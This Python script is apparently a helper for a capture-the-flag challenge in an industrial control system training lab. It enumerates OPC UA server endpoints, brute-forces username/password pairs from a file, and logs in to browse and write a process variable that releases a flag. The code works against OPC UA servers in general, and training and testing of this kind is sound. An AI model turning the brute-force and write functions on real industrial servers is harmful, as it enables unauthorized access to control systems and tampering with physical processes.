#!/usr/bin/env python3
"""
OPC UA reconnaissance and login helper for the CybICS OPC UA challenge.

A small asyncua replacement for the Metasploit modules from msf-opcua, so the
challenge also works from the attack shell, where Metasploit is not available:

  hello   connect anonymously and list the server's endpoints, their security
          policies and modes, and the user token types they accept
          (replaces opcua_hello and opcua_server_config)
  login   try username/password pairs from a file against the server
          (replaces opcua_login)
  read    log in with a username/password or a client certificate, browse the
          "CybICS Variables" object and optionally write one variable

Examples:
  python3 opcua_login.py hello 172.18.0.5
  python3 opcua_login.py login 172.18.0.5 credentials.txt
  python3 opcua_login.py read 172.18.0.5 --user user1 --password secret
  python3 opcua_login.py read 172.18.0.5 --cert cert.der --key key.pem \\
          --write "Set > 0 to obtain flag!=1"
"""
import argparse
import asyncio
import logging
import sys

from asyncua import Client, ua
from asyncua.crypto.security_policies import SecurityPolicyBasic256Sha256

DEFAULT_PORT = 4840
DEFAULT_PATH = "/freeopcua/server/"
TIMEOUT = 5


def endpoint_url(args):
    return f"opc.tcp://{args.host}:{args.port}{args.path}"


async def cmd_hello(args):
    """List the endpoints the server offers; GetEndpoints needs no session."""
    url = endpoint_url(args)
    client = Client(url, timeout=TIMEOUT)
    try:
        endpoints = await client.connect_and_get_server_endpoints()
    except Exception as e:
        print(f"[-] {url} - no OPC UA response: {e}")
        return 1
    print(f"[+] {url} - OPC UA server answered with {len(endpoints)} endpoint(s)")
    for ep in endpoints:
        policy = ep.SecurityPolicyUri.rsplit("#", 1)[-1]
        tokens = ", ".join(t.TokenType.name for t in ep.UserIdentityTokens)
        print(f"    {ep.EndpointUrl}")
        print(f"      security policy : {policy}")
        print(f"      security mode   : {ep.SecurityMode.name}")
        print(f"      user tokens     : {tokens}")
        if ep.ServerCertificate:
            print(f"      server cert     : {len(ep.ServerCertificate)} bytes")
    return 0


def read_pairs(path):
    """Yield (user, password) from a file with one 'user password' pair per line."""
    with open(path, encoding="utf-8", errors="replace") as f:
        for line in f:
            line = line.rstrip("\n")
            if not line.strip() or line.startswith("#"):
                continue
            if ":" in line and " " not in line:
                user, _, password = line.partition(":")
            else:
                user, _, password = line.partition(" ")
            yield user, password


async def try_login(url, user, password):
    client = Client(url, timeout=TIMEOUT)
    client.set_user(user)
    client.set_password(password)
    try:
        await client.connect()
    except Exception:
        return False
    try:
        await client.disconnect()
    except Exception:
        pass
    return True


async def cmd_login(args):
    url = endpoint_url(args)
    pairs = list(read_pairs(args.file))
    print(f"[*] {url} - trying {len(pairs)} credential pair(s)")
    found = 0
    for i, (user, password) in enumerate(pairs, 1):
        if await try_login(url, user, password):
            found += 1
            print(f"[+] [{i}/{len(pairs)}] - {user}:{password} - Success")
            if args.stop:
                break
        elif args.verbose:
            print(f"[-] [{i}/{len(pairs)}] - {user}:{password} - Failed")
    print(f"[*] Done, {found} valid pair(s) found")
    return 0 if found else 1


async def cmd_read(args):
    url = endpoint_url(args)
    client = Client(url, timeout=TIMEOUT)
    if args.cert:
        if not args.key:
            print("[-] --cert needs --key")
            return 2
        # The certificate is both the identity token and the key of a signed
        # and encrypted secure channel; asyncua sends it as an X509 token.
        await client.set_security(
            SecurityPolicyBasic256Sha256,
            certificate=args.cert,
            private_key=args.key,
            mode=ua.MessageSecurityMode.SignAndEncrypt,
        )
    elif args.user:
        client.set_user(args.user)
        client.set_password(args.password or "")

    try:
        await client.connect()
    except Exception as e:
        print(f"[-] {url} - login failed: {e}")
        return 1

    try:
        print(f"[+] {url} - connected")
        objects = client.nodes.objects
        target = None
        for child in await objects.get_children():
            name = (await child.read_browse_name()).Name
            if name == "CybICS Variables":
                target = child
                break
        if target is None:
            print("[-] 'CybICS Variables' object not found")
            return 1

        variables = {}
        for var in await target.get_children():
            name = (await var.read_browse_name()).Name
            variables[name] = var

        if args.write:
            name, _, value = args.write.rpartition("=")
            var = variables.get(name)
            if var is None:
                print(f"[-] no variable named {name!r}")
                return 1
            vtype = await var.read_data_type_as_variant_type()
            try:
                await var.write_value(ua.Variant(int(value), vtype))
                print(f"[+] wrote {value} to {name!r}")
                # The server refreshes its variables every 2 seconds.
                await asyncio.sleep(3)
            except ua.UaStatusCodeError as e:
                print(f"[-] write to {name!r} refused: {e}")

        for name, var in variables.items():
            try:
                value = await var.read_value()
            except Exception as e:
                value = f"<{e}>"
            print(f"    {name:28} {value}")
    finally:
        await client.disconnect()
    return 0


def main():
    parser = argparse.ArgumentParser(
        description="OPC UA hello, credential brute force and browse helper")
    sub = parser.add_subparsers(dest="cmd", required=True)

    def common(p):
        p.add_argument("host", help="OPC UA server IP, e.g. 172.18.0.5")
        p.add_argument("--port", type=int, default=DEFAULT_PORT)
        p.add_argument("--path", default=DEFAULT_PATH,
                       help=f"endpoint path (default {DEFAULT_PATH})")

    p = sub.add_parser("hello", help="list endpoints and security settings")
    common(p)

    p = sub.add_parser("login", help="brute-force username/password pairs")
    common(p)
    p.add_argument("file", help="file with one 'user password' pair per line")
    p.add_argument("--stop", action="store_true", help="stop at the first hit")
    p.add_argument("-v", "--verbose", action="store_true", help="print failures too")

    p = sub.add_parser("read", help="log in and browse the CybICS variables")
    common(p)
    p.add_argument("--user")
    p.add_argument("--password")
    p.add_argument("--cert", help="client certificate (.der) for X509 login")
    p.add_argument("--key", help="private key (.pem) of the certificate")
    p.add_argument("--write", metavar="NAME=VALUE",
                   help="write an integer to a variable before reading")

    args = parser.parse_args()
    logging.basicConfig(level=logging.CRITICAL)
    handler = {"hello": cmd_hello, "login": cmd_login, "read": cmd_read}[args.cmd]
    sys.exit(asyncio.run(handler(args)))


if __name__ == "__main__":
    main()
